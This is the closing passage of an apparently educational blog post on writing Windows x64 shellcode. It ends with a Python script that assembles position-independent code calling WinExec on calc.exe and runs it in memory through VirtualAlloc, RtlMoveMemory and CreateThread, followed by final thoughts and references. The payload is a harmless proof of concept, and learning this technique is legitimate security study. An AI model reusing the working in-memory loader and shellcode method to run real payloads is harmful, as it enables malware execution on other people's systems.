        "   add rax, r8;"                   # Convert function address RVA to absolute address
        "   mov r14, rax;"                  # Store the resolved function address in R14 for later use
        # WinExec Call
        "  xor rax, rax;"                   # Zero RAX to create a null byte
        "  push rax;"                       # Push the null byte onto the stack, acts as string terminator for "calc.exe"
        "  mov rax, 0x6578652E636C6163;"    # Move the reverse byte-order string 'calc.exe' into RAX
        "  push rax;"                       # Push the string 'calc.exe' onto the stack (Note: string must be reversed in memory)
        "  mov rcx, rsp;"                   # Set RCX to point to the string "calc.exe" on the stack, RCX is the first argument for WinExec
        "  xor rdx, rdx;"                   # Zero out RDX, preparing it for the next operation
        "  inc rdx;"                        # Set RDX to 1; this sets uCmdShow parameter for WinExec to SW_SHOWNORMAL
        "  sub rsp, 0x20;"                  # Allocate 32 bytes of shadow space on the stack to prevent overwriting during the call
        "  call r14;"                       # Call WinExec using the address stored in R14
    )
 
    # Initialize engine in 64-Bit mode
    ks = Ks(KS_ARCH_X86, KS_MODE_64)
    instructions, count = ks.asm(SHELLCODE)
 
    sh = b""
    output = ""
    for opcode in instructions:
        sh += struct.pack("B", opcode)                          # To encode for execution
        output += "\\x{0:02x}".format(int(opcode)).rstrip("\n") # For printable shellcode
 
 
    shellcode = bytearray(sh)
    print("Shellcode: " + output )
 
    # print("Attaching debugger to " + str(os.getpid()));
    # subprocess.Popen(["WinDbgX", "/g","/p", str(os.getpid())], shell=True)
    # input("Press any key to continue...");
 
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
    ctypes.windll.kernel32.RtlCopyMemory.argtypes = ( ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t ) 
    ctypes.windll.kernel32.CreateThread.argtypes = ( ctypes.c_int, ctypes.c_int, ctypes.c_void_p, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_int) ) 
 
    space = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
    buff = ( ctypes.c_char * len(shellcode) ).from_buffer_copy( shellcode )
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(space),buff,ctypes.c_int(len(shellcode)))
    handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_void_p(space),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(handle, -1);
 
if __name__ == "__main__":
    main()
```
<img src="{{ site.url }}{{ site.baseurl }}/images/2024-05-02_07-00.png" alt="">

Final thoughts
---

This post has been immensely helpful for consolidating my knowledge about shellcode creation on x64 architectures. Exploring the Microsoft documentation and guides on other blogs has proven to be very beneficial.

If there is anything I have missed or could be improved, please do not hesitate to contact me and let me know.

### References

* [https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention](https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention){:target="_blank"}
* [https://www.bordergate.co.uk/windows-x64-shellcode-development/](https://www.bordergate.co.uk/windows-x64-shellcode-development/){:target="_blank"}
* [https://defuse.ca/online-x86-assembler.htm#disassembly](https://defuse.ca/online-x86-assembler.htm#disassembly){:target="_blank"}
* [https://ferreirasc.github.io/PE-Export-Address-Table/](https://ferreirasc.github.io/PE-Export-Address-Table/){:target="_blank"}
* [https://wajid-nawazish.medium.com/developing-custom-shellcode-in-x64-57172a885d77](https://wajid-nawazish.medium.com/developing-custom-shellcode-in-x64-57172a885d77){:target="_blank"}